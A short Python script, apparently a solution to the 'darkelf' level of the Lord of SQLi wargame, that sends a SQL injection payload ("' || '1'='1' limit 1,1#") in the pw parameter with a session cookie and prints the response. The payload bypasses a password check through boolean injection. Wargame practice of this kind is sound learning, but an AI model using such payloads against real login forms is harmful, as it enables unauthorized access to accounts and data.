import requests

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php"

payload = "' || '1'='1' limit 1,1#"
params = {"pw": payload}

r = requests.get(url, params=params, cookies=cookies)
print(r.text)